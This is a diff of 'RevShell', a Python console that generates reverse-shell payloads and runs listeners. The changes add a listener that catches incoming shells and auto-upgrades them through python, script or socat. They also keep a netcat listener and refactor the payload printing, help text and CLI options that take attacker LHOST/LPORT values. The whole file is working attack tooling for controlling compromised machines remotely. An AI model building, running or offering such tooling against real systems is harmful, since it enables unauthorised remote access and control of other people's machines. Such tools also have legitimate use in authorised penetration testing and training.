+    print(f"  {C.g('[✔]')} Shell upgraded via {method} — enjoy!\r")
+    print(f"  {C.grey('Ctrl+C to exit shell')}\r\n")
+    _relay_interactive(sock)
+
+
+# ─── Smart listener ───────────────────────────────────────────────────────────
+
+def smart_listener(port: str, lhost: str, use_rlwrap: bool = False,
+                   auto_upgrade_flag: bool = True) -> None:
+    """
+    Open a TCP listener, wait for a connection, then auto-upgrade the shell.
+    Pure Python — no nc required for the auto-upgrade path.
+    """
+    try:
+        lport_int = int(port)
+    except ValueError:
+        print(C.r(f"  Invalid port: {port}"))
+        return
+
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        srv.bind(("0.0.0.0", lport_int))
+    except OSError as e:
+        print(C.r(f"  Could not bind port {port}: {e}"))
+        return
+
+    srv.listen(1)
+
+    print(f"\n  {C.grey('─' * 62)}")
+    print(f"  {C.bold('Smart Listener')}  {C.g(f'0.0.0.0:{port}')}")
+    if auto_upgrade_flag:
+        print(f"  {C.grey('Auto-upgrade: ON')}  "
+              f"{C.grey('(python3 → python2 → script → socat → dumb)')}")
+    print(f"  {C.grey('Ctrl+C to stop')}")
+    print(f"  {C.grey('─' * 62)}\n")
+
+    try:
+        srv.settimeout(None)
+        conn, addr = srv.accept()
+        remote_ip, remote_port = addr
+        srv.close()
+
+        print(f"  {C.g('[+]')} Connection from {C.bold(C.c(remote_ip))}:{remote_port}\r\n")
+
+        if auto_upgrade_flag:
+            auto_upgrade(conn, lhost, port)
+        else:
+            print(f"  {C.grey('Auto-upgrade disabled — dumb relay (Ctrl+C to exit)')}\r\n")
+            _relay_interactive(conn)
+
+        conn.close()
+        print(f"\n  {C.grey('Connection closed.')}\n")
+
+    except KeyboardInterrupt:
+        srv.close()
+        print(f"\n\n  {C.grey('Listener stopped.')}\n")
+    except OSError as e:
+        print(C.r(f"  Socket error: {e}"))
+
+
+# ─── Legacy nc listener (kept for rlwrap / fallback) ─────────────────────────
+
+def find_nc() -> Optional[tuple[str, str]]:
+    for binary in NC_CANDIDATES:
+        path = shutil.which(binary)
+        if path:
+            return binary, path
+    return None
+
+
+def nc_listener(port: str, use_rlwrap: bool = False) -> None:
+    result = find_nc()
+    if result is None:
+        print(f"\n  {C.r('Netcat not found.')}  sudo apt install netcat-openbsd\n")
+        return
+    binary, path = result
+    cmd = [binary, "-lvnp", port]
+    if use_rlwrap:
+        if not shutil.which("rlwrap"):
+            print(f"  {C.y('rlwrap not found — falling back to plain netcat.')}")
+        else:
+            cmd = ["rlwrap"] + cmd
+    print(f"\n  {C.grey('─' * 60)}")
+    print(f"  {C.bold('Listener')}   {C.g(' '.join(cmd))}")
+    print(f"  {C.grey(f'Binary: {path}')}")
+    print(f"  {C.grey('Waiting on port')} {C.g(port)}  {C.grey('Ctrl+C to stop')}")
+    print(f"  {C.grey('─' * 60)}\n")
+    try:
+        subprocess.run(cmd)
+    except KeyboardInterrupt:
+        print(f"\n  {C.grey('Listener stopped.')}\n")
+    except FileNotFoundError:
+        print(C.r(f"  Could not execute '{cmd[0]}'."))
+
+
+# ─── Network interface helpers ────────────────────────────────────────────────
 
 def get_interfaces() -> dict[str, str]:
     ifaces: dict[str, str] = {}
-
     try:
         import fcntl
         SIOCGIFADDR = 0x8915
@@ -336,7 +571,6 @@ def get_interfaces() -> dict[str, str]:
             return ifaces
     except Exception:
         pass
-
     try:
         out = subprocess.check_output(["ip", "-4", "addr", "show"],
                                       stderr=subprocess.DEVNULL, text=True)
@@ -353,7 +587,6 @@ def get_interfaces() -> dict[str, str]:
             return ifaces
     except Exception:
         pass
-
     try:
         out = subprocess.check_output(["ifconfig"],
                                       stderr=subprocess.DEVNULL, text=True)
@@ -373,7 +606,6 @@ def get_interfaces() -> dict[str, str]:
             return ifaces
     except Exception:
         pass
-
     return ifaces
 
 
@@ -394,11 +626,11 @@ def print_interfaces(highlight: Optional[str] = None) -> None:
     if not ifaces:
         print(f"  {C.r('  No interfaces found.')}")
     for name, ip in ifaces.items():
-        is_hl = highlight and name == highlight
-        marker = f"  {C.y('◀')}" if is_hl else ""
-        name_s = C.bold(C.g(name)) if is_hl else C.g(name)
-        ip_s   = C.bold(C.c(ip))   if is_hl else ip
-        name_pad = 28 + (len(C.GREEN)+len(C.END)) + (len(C.BOLD) if is_hl else 0)
+        is_hl    = bool(highlight and name == highlight)
+        marker   = f"  {C.y('◀')}" if is_hl else ""
+        name_s   = C.bold(C.g(name)) if is_hl else C.g(name)
+        ip_s     = C.bold(C.c(ip))   if is_hl else ip
+        name_pad = 28 + len(C.GREEN) + len(C.END) + (len(C.BOLD) if is_hl else 0)
         print(f"  {name_s:<{name_pad}}{ip_s}{marker}")
     print(f"  {C.grey('─' * W)}\n")
 
@@ -414,7 +646,8 @@ def interactive_iface_picker(session: "Session") -> None:
     print(f"  {C.bold('  #'):<8}{C.bold('INTERFACE'):<22}{C.bold('IPv4')}")
     print(f"  {C.grey('─' * W)}")
     for i, (name, ip) in enumerate(entries, 1):
-        print(f"  {C.grey(str(i)):<{6+len(C.GREY)+len(C.END)}}{C.g(name):<{22+len(C.GREEN)+len(C.END)}}{ip}")
+        print(f"  {C.grey(str(i)):<{6+len(C.GREY)+len(C.END)}}"
+              f"{C.g(name):<{22+len(C.GREEN)+len(C.END)}}{ip}")
     print(f"  {C.grey('─' * W)}")
     print(f"  {C.grey('Number or name (empty to cancel):')}")
     try:
@@ -442,9 +675,7 @@ def interactive_iface_picker(session: "Session") -> None:
     print(f"\n  LHOST  {C.grey('=>')}  {C.bold(C.g(ip))}  {C.grey('(' + name + ')')}\n")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Session
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Session (LHOST/LPORT config) ────────────────────────────────────────────
 
 class Session:
     def __init__(self):
@@ -460,9 +691,8 @@ class Session:
                     return False, None
                 self.lhost = ip
                 return True, ip
-            else:
-                self.lhost = value
-                return True, None
+            self.lhost = value
+            return True, None
         if k in ("port", "lport"):
             self.lport = value
             return True, None
@@ -475,71 +705,7 @@ class Session:
         return self.lport if self.lport else C.r("<LPORT>")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Listener
-# ─────────────────────────────────────────────────────────────────────────────
-
-def find_nc() -> Optional[tuple[str, str]]:
-    for binary in NC_CANDIDATES:
-        path = shutil.which(binary)
-        if path:
-            return binary, path
-    return None
-
-
-def start_listener(port: str, use_rlwrap: bool = False) -> None:
-    result = find_nc()
-    if result is None:
-        print(f"\n  {C.r('Netcat not found.')}  sudo apt install netcat-openbsd\n")
-        return
-    binary, path = result
-    cmd = [binary, "-lvnp", port]
-    if use_rlwrap:
-        if not shutil.which("rlwrap"):
-            print(f"  {C.y('rlwrap not found — falling back to plain netcat.')}")
-        else:
-            cmd = ["rlwrap"] + cmd
-    print(f"\n  {C.grey('─' * 60)}")
-    print(f"  {C.bold('Listener')}   {C.g(' '.join(cmd))}")
-    print(f"  {C.grey(f'Binary: {path}')}")
-    print(f"  {C.grey('Waiting on port')} {C.g(port)} {C.grey('  Ctrl+C to stop')}")
-    print(f"  {C.grey('─' * 60)}\n")
-    try:
-        subprocess.run(cmd)
-    except KeyboardInterrupt:
-        print(f"\n  {C.grey('Listener stopped.')}\n")
-    except FileNotFoundError:
-        print(C.r(f"  Could not execute '{cmd[0]}'."))
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-#  Shell execution
-# ─────────────────────────────────────────────────────────────────────────────
-
-def run_shell_command(raw_cmd: str) -> None:
-    """Execute a native shell command and stream output."""
-    print(f"\n  {C.grey('─' * 60)}")
-    try:
-        result = subprocess.run(
-            raw_cmd, shell=True, text=True,
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE
-        )
-        if result.stdout:
-            for line in result.stdout.splitlines():
-                print(f"  {line}")
-        if result.stderr:
-            for line in result.stderr.splitlines():
-                print(f"  {C.grey(line)}")
-        if result.returncode != 0:
-            print(f"\n  {C.grey('Exit code:')} {C.y(str(result.returncode))}")
-    except Exception as e:
-        print(f"  {C.r(str(e))}")
-    print(f"  {C.grey('─' * 60)}\n")
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-#  Config persistence
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Config persistence ───────────────────────────────────────────────────────
 
 def load_config() -> dict:
     try:
@@ -564,68 +730,28 @@ def change_config(host: Optional[str] = None, port: Optional[str] = None) -> Non
         print(C.r(f"  Failed to write config: {e}"))
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  UI strings
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Shell passthrough ────────────────────────────────────────────────────────
 
-BANNER = f"""
-{C.WHITE}
-╔══════════════════════════════════════════════════════════════╗
-║                          RevShell                            ║
-╚══════════════════════════════════════════════════════════════╝
-{C.END}{C.DIM}
-  reverse shells payload manager console{C.END}s
-{C.END}{C.DIM}  Author: {C.BOLD}{C.RED}@ZetaOrioniss{C.END}
-{C.END}{C.DIM}  Version: {C.BOLD}{C.RED}v2.0{C.END}
-{C.DIM}
-{C.DIM}  Type {C.END}{C.BOLD}help{C.END}{C.DIM} to list available commands.{C.END}
-"""
-
-HELP = f"""
-  {C.bold('CONFIGURATION')}
-  {C.g('load config')}            Load LHOST/LPORT from conf.json
-  {C.g('set ip <addr|iface>')}    Set LHOST — IP address or interface name
-  {C.g('set port <port>')}        Set LPORT
-  {C.g('unset ip|port')}          Clear a value
-  {C.g('show options')}           Print current LHOST / LPORT
-
-  {C.bold('NETWORK')}
-  {C.g('ifconfig')}               List IPv4 interfaces
-  {C.g('ifconfig pick')}          Interactive picker -> sets LHOST
-
-  {C.bold('PAYLOADS')}
-  {C.g('show')}                   List all payloads with keys
-  {C.g('show <category>')}        Filter by category (bash/python/php...)
-  {C.g('use <key>')}              Print a single payload
-  {C.g('run')}                    Print all payloads (current config)
-  {C.g('run <key>')}              Print one payload by key
-  {C.g('run --unix')}             Filter: Unix platforms only
-  {C.g('run --windows')}          Filter: Windows platforms only
-  {C.g('run --cat <name>')}       Filter: by category name
-
-  {C.bold('LISTENER')}
-  {C.g('listener')}               Start  nc -lvnp <LPORT>
-  {C.g('rlwrap')}                 Start listener with rlwrap (better TTY)
-
-  {C.bold('SHELL (native commands)')}
-  {C.g('! <command>')}            Execute a native system command
-  {C.g('shell')}                  Drop into interactive /bin/bash
-
-  {C.bold('OTHER')}
-  {C.g('clear')}                  Clear screen
-  {C.g('help')}                   Show this help
-  {C.g('exit')} / {C.g('quit')}           Exit
-"""
+def run_shell_command(raw_cmd: str) -> None:
+    print(f"\n  {C.grey('─' * 60)}")
+    try:
+        result = subprocess.run(raw_cmd, shell=True, text=True,
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        for line in result.stdout.splitlines():
+            print(f"  {line}")
+        for line in result.stderr.splitlines():
+            print(f"  {C.grey(line)}")
+        if result.returncode != 0:
+            print(f"\n  {C.grey('Exit code:')} {C.y(str(result.returncode))}")
+    except Exception as e:
+        print(f"  {C.r(str(e))}")
+    print(f"  {C.grey('─' * 60)}\n")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Display helpers
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Display helpers ──────────────────────────────────────────────────────────
 
 def _render_cmd(p: Payload, session: Session) -> str:
-    lhost = session.render_lhost()
-    lport = session.render_lport()
-    return p.render(lhost, lport)
+    return p.render(session.render_lhost(), session.render_lport())
 
 
 def print_all_payloads(session: Session,
@@ -635,7 +761,6 @@ def print_all_payloads(session: Session,
     title = f" {session.lhost or 'LHOST'}:{session.lport or 'LPORT'} "
     print(f"\n  {C.bold(C.WHITE + title.center(W - 2) + C.END)}")
     print(f"  {C.grey('=' * W)}")
-
     for cat in CATEGORIES:
         if cat_filter and cat != cat_filter:
             continue
@@ -643,21 +768,16 @@ def print_all_payloads(session: Session,
                   and (platform_filter is None or p.platform in (platform_filter, "both"))]
         if not bucket:
             continue
-
         label = CATEGORY_LABELS.get(cat, cat.upper())
         print(f"\n  {C.bold(C.CYAN + '  ' + label.upper() + C.END)}")
         print(f"  {C.grey('.' * W)}")
-
         for p in bucket:
             icon = PLATFORM_ICON.get(p.platform, "")
             cmd  = _render_cmd(p, session)
             note = f"  {C.grey(p.note)}" if p.note else ""
-            key_col = C.grey(f"[{p.key}]")
-            name_col = C.bold(p.name)
-            print(f"  {name_col}  {key_col}  {icon}{note}")
+            print(f"  {C.bold(p.name)}  {C.grey('[' + p.key + ']')}  {icon}{note}")
             print(f"  {C.GREEN}{cmd}{C.END}")
             print(f"  {C.grey('.' * W)}")
-
     print(f"  {C.grey('=' * W)}\n")
 
 
@@ -665,9 +785,9 @@ def print_single_payload(p: Payload, session: Session) -> None:
     cmd  = _render_cmd(p, session)
     icon = PLATFORM_ICON.get(p.platform, "")
     W    = 80
-
     print(f"\n  {C.grey('-' * W)}")
-    print(f"  {C.bold(C.WHITE)}{icon} {p.name}{C.END}  {C.grey(p.key)}  {C.grey('(' + p.platform + '/' + p.category + ')')}")
+    print(f"  {C.bold(C.WHITE)}{icon} {p.name}{C.END}  "
+          f"{C.grey(p.key)}  {C.grey('(' + p.platform + '/' + p.category + ')')}")
     if p.note:
         print(f"  {C.grey(p.note)}")
     print(f"  {C.grey('-' * W)}")
@@ -680,7 +800,8 @@ def print_single_payload(p: Payload, session: Session) -> None:
 def print_payload_list(cat_filter: Optional[str] = None) -> None:
     W = 70
     print(f"\n  {C.grey('-' * W)}")
-    print(f"  {C.bold('  KEY'):<{28+len(C.BOLD)+len(C.END)}}{C.bold('NAME'):<22}{C.bold('OS'):<14}{C.bold('CATEGORY')}")
+    print(f"  {C.bold('  KEY'):<{28+len(C.BOLD)+len(C.END)}}"
+          f"{C.bold('NAME'):<22}{C.bold('OS'):<14}{C.bold('CAT')}")
     print(f"  {C.grey('-' * W)}")
     last_cat = None
     for p in PAYLOADS:
@@ -691,17 +812,66 @@ def print_payload_list(cat_filter: Optional[str] = None) -> None:
             label = CATEGORY_LABELS.get(p.category, p.category)
             print(f"\n  {C.bold(C.CYAN + '  ' + label + C.END)}")
         icon = PLATFORM_ICON.get(p.platform, "")
-        print(f"  {C.g(p.key):<{26+len(C.GREEN)+len(C.END)}}{p.name:<22}{icon + ' ' + p.platform:<14}")
+        print(f"  {C.g(p.key):<{26+len(C.GREEN)+len(C.END)}}"
+              f"{p.name:<22}{icon + ' ' + p.platform:<14}")
     print(f"\n  {C.grey('-' * W)}\n")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Tab completion
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Banner / Help ────────────────────────────────────────────────────────────
+
+BANNER = f"""
+{C.WHITE}
+╔══════════════════════════════════════════════════════════════╗
+║                          RevShell                            ║
+╚══════════════════════════════════════════════════════════════╝{C.END}
+{C.DIM}  reverse shell payload manager console{C.END}
+{C.DIM}  Author: {C.BOLD}{C.RED}@ZetaOrioniss{C.END}   {C.DIM}Version: {C.BOLD}{C.RED}v2.1{C.END}
+{C.DIM}  Type {C.END}{C.BOLD}help{C.END}{C.DIM} to list available commands.{C.END}
+"""
+
+HELP = f"""
+  {C.bold('CONFIGURATION')}
+  {C.g('load config')}                  Load LHOST/LPORT from conf.json
+  {C.g('set ip <addr|iface>')}          Set LHOST — IP or interface name (e.g. tun0)
+  {C.g('set port <port>')}              Set LPORT
+  {C.g('unset ip|port')}                Clear a value
+  {C.g('show options')}                 Current LHOST / LPORT
+
+  {C.bold('NETWORK')}
+  {C.g('ifconfig')}                     List IPv4 interfaces
+  {C.g('ifconfig pick')}                Interactive picker → sets LHOST
+
+  {C.bold('PAYLOADS')}
+  {C.g('show')}                         List all payloads with keys
+  {C.g('show <category>')}              Filter by category  (bash / python / php ...)
+  {C.g('use <key>')}                    Print a single payload
+  {C.g('run')}                          Print all payloads
+  {C.g('run <key>')}                    Print one payload by key
+  {C.g('run --unix')}                   Unix payloads only
+  {C.g('run --windows')}                Windows payloads only
+  {C.g('run --cat <name>')}             Filter by category
+
+  {C.bold('LISTENER')}
+  {C.g('listener')}                     Smart listener: auto-upgrades shell on connect
+  {C.g('listener --no-upgrade')}        Smart listener without auto-upgrade
+  {C.g('rlwrap')}                       Classic rlwrap nc -lvnp (no auto-upgrade)
+
+  {C.bold('SHELL')}
+  {C.g('! <command>')}                  Run a native system command
+  {C.g('shell')}                        Drop into /bin/bash
+
+  {C.bold('OTHER')}
+  {C.g('clear')}                        Clear screen
+  {C.g('help')}                         Show this help
+  {C.g('exit')} / {C.g('quit')}                 Exit
+"""
+
+
+# ─── Tab completion ───────────────────────────────────────────────────────────
 
 COMMANDS  = ["load", "set", "unset", "use", "run", "generate", "show",
-             "ifconfig", "interfaces", "listener", "rlwrap", "clear",
-             "help", "exit", "quit", "shell", "!"]
+             "ifconfig", "interfaces", "listener", "rlwrap", "shell",
+             "clear", "help", "exit", "quit", "!"]
 SET_KEYS  = ["ip", "port", "lhost", "lport", "host"]
 SHOW_OPTS = ["payloads", "options"] + CATEGORIES
 SHELL_KEYS = [p.key for p in PAYLOADS]
@@ -725,12 +895,14 @@ def completer(text: str, state: int):
         opts = [k for k in SET_KEYS if k.startswith(text)]
     elif parts[0] == "set" and n == 3 and parts[1].lower() in ("ip","host","lhost"):
         opts = [x for x in _iface_names() if x.startswith(text)]
-    elif parts[0] in ("use", "run") and n <= 2:
+    elif parts[0] in ("use","run") and n <= 2:
         opts = [k for k in SHELL_KEYS if k.startswith(text)]
     elif parts[0] == "show" and n <= 2:
         opts = [o for o in SHOW_OPTS if o.startswith(text)]
     elif parts[0] == "unset" and n <= 2:
         opts = [k for k in ("ip","port") if k.startswith(text)]
+    elif parts[0] == "listener" and n <= 2:
+        opts = [o for o in ("--no-upgrade",) if o.startswith(text)]
     elif parts[0] in ("ifconfig","interfaces") and n <= 2:
         opts = [o for o in ("pick",)+tuple(_iface_names()) if o.startswith(text)]
     else:
@@ -743,19 +915,17 @@ readline.set_completer(completer)
 readline.parse_and_bind("tab: complete")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Prompt
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Prompt ───────────────────────────────────────────────────────────────────
 
 def prompt(session: Session) -> str:
     h = session.lhost or C.grey("-")
     p = session.lport or C.grey("-")
-    return f"{C.BOLD}{C.RED}revshell{C.END} {C.grey(f'({h}:{p})')} {C.BOLD}{C.GREEN}>{C.END} "
+    return (f"{C.BOLD}{C.RED}revshell{C.END}"
+            f" {C.grey(f'({h}:{p})')}"
+            f" {C.BOLD}{C.GREEN}>{C.END} ")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  CLI argument parser
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── CLI args ─────────────────────────────────────────────────────────────────
 
 def build_arg_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
@@ -764,172 +934,99 @@ def build_arg_parser() -> argparse.ArgumentParser:
         formatter_class=argparse.RawTextHelpFormatter,
         epilog=(
             "examples:\n"
-            "  revshell.py                                  # interactive console\n"
-            "  revshell.py -H 10.10.14.5 -P 4444           # console with LHOST/LPORT pre-set\n"
-            "  revshell.py -H 10.10.14.5 -P 4444 -u bash_tcp\n"
-            "                                               # print one payload and exit\n"
-            "  revshell.py -H 10.10.14.5 -P 4444 --all     # print all payloads and exit\n"
-            "  revshell.py -H 10.10.14.5 -P 4444 --all --unix --cat python\n"
-            "                                               # filter: unix python payloads\n"
-            "  revshell.py --list                           # list payload keys and exit\n"
-            "  revshell.py --list --cat netcat              # list netcat payloads only\n"
-            "  revshell.py --ifconfig                       # list interfaces and exit\n"
-            "  revshell.py -H tun0 -P 4444 -u socat        # resolve interface name to IP\n"
-            "  revshell.py -H 10.10.14.5 -P 4444 --listen  # start nc listener and exit\n"
-            "  revshell.py -H 10.10.14.5 -P 4444 --rlwrap  # start rlwrap listener and exit\n"
-            "  revshell.py -H 10.0.0.1 -P 4444 -u bash_tcp --raw | xclip\n"
-            "                                               # bare command, pipe-friendly\n"
+            "  revshell.py                                 # interactive console\n"
+            "  revshell.py -H 10.10.14.5 -P 4444          # pre-set LHOST/LPORT\n"
+            "  revshell.py -H tun0 -P 4444 -u bash_tcp    # resolve iface + one payload\n"
+            "  revshell.py -H 10.10.14.5 -P 4444 --all    # all payloads, then exit\n"
+            "  revshell.py --list --cat netcat             # list netcat payloads\n"
+            "  revshell.py -H 10.0.0.1 -P 4444 -u nc_e --raw | xclip\n"
         )
     )
-
-    # ── Connection params ────────────────────────────────────────────────────
     conn = parser.add_argument_group("connection")
-    conn.add_argument(
-        "-H", "--host", metavar="LHOST",
-        help="Attacker IP or interface name (e.g. 10.10.14.5, tun0, eth0)"
-    )
-    conn.add_argument(
-        "-P", "--port", metavar="LPORT",
-        help="Listener port (e.g. 4444)"
-    )
-
-    # ── One-shot payload output ───────────────────────────────────────────────
-    out = parser.add_argument_group("one-shot output (non-interactive)")
-    out.add_argument(
-        "-u", "--use", metavar="KEY",
-        help="Print a single payload by key and exit"
-    )
-    out.add_argument(
-        "--all", action="store_true",
-        help="Print all payloads and exit (respects --unix/--windows/--cat)"
-    )
-    out.add_argument(
-        "--list", action="store_true",
-        help="List payload keys/names in table view and exit"
-    )
-    out.add_argument(
-        "--raw", action="store_true",
-        help=(
-            "With -u/--use: output bare command only, no decoration, no colors.\n"
-            "Useful for piping: revshell.py -H 10.0.0.1 -P 4444 -u bash_tcp --raw | xclip"
-        )
-    )
-
-    # ── Filters ───────────────────────────────────────────────────────────────
+    conn.add_argument("-H","--host", metavar="LHOST",
+        help="Attacker IP or interface name (e.g. tun0)")
+    conn.add_argument("-P","--port", metavar="LPORT", help="Listener port")
+    out = parser.add_argument_group("one-shot output")
+    out.add_argument("-u","--use", metavar="KEY",
+        help="Print a single payload by key and exit")
+    out.add_argument("--all", action="store_true",
+        help="Print all payloads and exit")
+    out.add_argument("--list", action="store_true",
+        help="List payload keys/names and exit")
+    out.add_argument("--raw", action="store_true",
+        help="With -u: bare command only, no colours")
     flt = parser.add_argument_group("filters")
-    flt.add_argument(
-        "--unix", action="store_true",
-        help="Show Unix/Linux payloads only"
-    )
-    flt.add_argument(
-        "--windows", action="store_true",
-        help="Show Windows payloads only"
-    )
-    flt.add_argument(
-        "--cat", metavar="CATEGORY",
-        choices=CATEGORIES,
-        help="Filter by category: " + ", ".join(CATEGORIES)
-    )
-
-    # ── Listener ──────────────────────────────────────────────────────────────
+    flt.add_argument("--unix",    action="store_true", help="Unix payloads only")
+    flt.add_argument("--windows", action="store_true", help="Windows payloads only")
+    flt.add_argument("--cat", metavar="CAT", choices=CATEGORIES,
+        help="Filter by category")
     lst = parser.add_argument_group("listener")
-    lst.add_argument(
-        "--listen", action="store_true",
-        help="Start nc -lvnp <LPORT> and exit (requires -P)"
-    )
-    lst.add_argument(
-        "--rlwrap", action="store_true",
-        help="Start rlwrap nc -lvnp <LPORT> and exit (requires -P)"
-    )
-
-    # ── Misc ──────────────────────────────────────────────────────────────────
+    lst.add_argument("--listen",     action="store_true",
+        help="Start smart listener (auto-upgrade) and exit")
+    lst.add_argument("--rlwrap",     action="store_true",
+        help="Start rlwrap nc -lvnp and exit")
+    lst.add_argument("--no-upgrade", dest="no_upgrade", action="store_true",
+        help="Disable auto-upgrade with --listen")
     misc = parser.add_argument_group("misc")
-    misc.add_argument(
-        "--ifconfig", action="store_true",
-        help="List IPv4 interfaces and exit"
-    )
-    misc.add_argument(
-        "--no-banner", dest="no_banner", action="store_true",
-        help="Suppress the banner in interactive mode"
-    )
-
+    misc.add_argument("--ifconfig",  action="store_true",
+        help="List interfaces and exit")
+    misc.add_argument("--no-banner", dest="no_banner", action="store_true",
+        help="Suppress banner")
     return parser
 
 
 def run_cli(args: argparse.Namespace) -> int:
-    """
-    Execute non-interactive CLI actions.
-    Returns 0 on success, 1 on error.
-    Sentinel -1 means no non-interactive flag matched (launch console instead).
-    """
     session = Session()
-
-    # Resolve LHOST — may be an interface name
     if args.host:
         if is_interface_name(args.host):
             ip = resolve_iface_ip(args.host)
             if ip is None:
-                print(C.r(f"  Interface '{args.host}' not found. Run --ifconfig to list."),
-                      file=sys.stderr)
+                print(C.r(f"  Interface '{args.host}' not found."), file=sys.stderr)
                 return 1
             session.lhost = ip
         else:
             session.lhost = args.host
-
     if args.port:
         session.lport = args.port
 
-    # ── --ifconfig ────────────────────────────────────────────────────────────
     if args.ifconfig:
         print_interfaces()
         return 0
-
-    # ── --list ────────────────────────────────────────────────────────────────
     if args.list:
         print_payload_list(cat_filter=args.cat)
         return 0
-
-    # ── --use / -u ────────────────────────────────────────────────────────────
     if args.use:
         key = args.use.lower()
         if key not in PAYLOAD_MAP:
-            print(C.r(f"  Unknown payload key: '{args.use}'"), file=sys.stderr)
-            print(C.grey("  Run --list to see available keys."), file=sys.stderr)
+            print(C.r(f"  Unknown key: '{args.use}'"), file=sys.stderr)
             return 1
         p = PAYLOAD_MAP[key]
         if args.raw:
-            # Bare command — no ANSI, no decoration; pipe-friendly
-            lhost = session.lhost or "<LHOST>"
-            lport = session.lport or "<LPORT>"
-            print(p.render(lhost, lport))
+            print(p.render(session.lhost or "<LHOST>", session.lport or "<LPORT>"))
         else:
             print_single_payload(p, session)
         return 0
-
-    # ── --all ─────────────────────────────────────────────────────────────────
     if args.all:
-        platform_filter: Optional[str] = None
-        if args.unix:
-            platform_filter = "unix"
-        elif args.windows:
-            platform_filter = "windows"
-        print_all_payloads(session, platform_filter=platform_filter, cat_filter=args.cat)
+        pf = "unix" if args.unix else ("windows" if args.windows else None)
+        print_all_payloads(session, platform_filter=pf, cat_filter=args.cat)
         return 0
-
-    # ── --listen / --rlwrap ───────────────────────────────────────────────────
-    if args.listen or args.rlwrap:
+    if args.listen:
         if not session.lport:
             print(C.r("  LPORT not set — pass -P <port>"), file=sys.stderr)
             return 1
-        start_listener(session.lport, use_rlwrap=args.rlwrap)
+        smart_listener(session.lport, lhost=session.lhost or "0.0.0.0",
+                       auto_upgrade_flag=not args.no_upgrade)
         return 0
+    if args.rlwrap:
+        if not session.lport:
+            print(C.r("  LPORT not set — pass -P <port>"), file=sys.stderr)
+            return 1
+        nc_listener(session.lport, use_rlwrap=True)
+        return 0
+    return -1
 
-    return -1   # Sentinel: no non-interactive action matched
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-#  Main interactive loop
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Main interactive loop ────────────────────────────────────────────────────
 
 def run_console(session: Optional[Session] = None, no_banner: bool = False) -> None:
     if not no_banner:
@@ -947,13 +1044,9 @@ def run_console(session: Optional[Session] = None, no_banner: bool = False) -> N
         if not raw:
             continue
 
-        # ── Native shell command via ! prefix ─────────────────────────────
         if raw.startswith("!"):
             cmd_str = raw[1:].strip()
-            if cmd_str:
-                run_shell_command(cmd_str)
-            else:
-                print(f"  {C.r('Usage: ! <command>')}")
+            run_shell_command(cmd_str) if cmd_str else print(C.r("  Usage: ! <command>"))
             continue
 
         try:
@@ -962,24 +1055,20 @@ def run_console(session: Optional[Session] = None, no_banner: bool = False) -> N
             print(C.r(f"  Parse error: {e}"))
             continue
 
-        cmd      = parts[0].lower()
-        args_lst = parts[1:]
+        cmd  = parts[0].lower()
+        args = parts[1:]
 
-        # ── exit ──────────────────────────────────────────────────────────
-        if cmd in ("exit", "quit"):
+        if cmd in ("exit","quit"):
             print(f"\n  {C.grey('Goodbye.')}\n")
             break
 
-        # ── help ──────────────────────────────────────────────────────────
         elif cmd == "help":
             print(HELP)
 
-        # ── clear ─────────────────────────────────────────────────────────
         elif cmd == "clear":
             print("\033[2J\033[H", end="")
             print(BANNER)
 
-        # ── shell ─────────────────────────────────────────────────────────
         elif cmd == "shell":
             print(f"\n  {C.grey('Dropping into /bin/bash  (exit to return)')}\n")
             try:
@@ -987,68 +1076,60 @@ def run_console(session: Optional[Session] = None, no_banner: bool = False) -> N
             except Exception as e:
                 print(C.r(f"  {e}"))
 
-        # ── load config ───────────────────────────────────────────────────
         elif cmd == "load":
-            if len(args_lst) != 1 or args_lst[0].lower() != "config":
-                print(f"  {C.r('Usage: load config')}")
+            if len(args) != 1 or args[0].lower() != "config":
+                print(C.r("  Usage: load config"))
             else:
-                config = load_config()
-                param  = config.get("param", {})
-                host   = param.get("host", "")
-                port   = param.get("port", "")
+                param = load_config().get("param", {})
+                host  = param.get("host","")
+                port  = param.get("port","")
                 if host:
                     session.lhost = host
                     print(f"  LHOST  {C.grey('=>')}  {C.g(host)}")
                 else:
-                    print(f"  {C.grey('LHOST not set in config.')}")
+                    print(C.grey("  LHOST not set in config."))
                 if port:
                     session.lport = port
                     print(f"  LPORT  {C.grey('=>')}  {C.g(port)}")
                 else:
-                    print(f"  {C.grey('LPORT not set in config.')}")
+                    print(C.grey("  LPORT not set in config."))
 
-        # ── set ───────────────────────────────────────────────────────────
         elif cmd == "set":
-            if len(args_lst) < 2:
-                print(f"  {C.r('Usage: set <ip|port> <value|iface>')}")
+            if len(args) < 2:
+                print(C.r("  Usage: set <ip|port> <value|iface>"))
             else:
-                ok, resolved = session.set(args_lst[0], args_lst[1])
+                ok, resolved = session.set(args[0], args[1])
                 if ok:
-                    label   = "LHOST" if args_lst[0].lower() in ("ip","host","lhost") else "LPORT"
-                    display = resolved if resolved else args_lst[1]
-                    extra   = f"  {C.grey('(from interface ' + args_lst[1] + ')')}" if resolved else ""
+                    label   = "LHOST" if args[0].lower() in ("ip","host","lhost") else "LPORT"
+                    display = resolved if resolved else args[1]
+                    extra   = f"  {C.grey('(from ' + args[1] + ')')}" if resolved else ""
                     print(f"  {label}  {C.grey('=>')}  {C.g(display)}{extra}")
-                    if label == "LHOST":
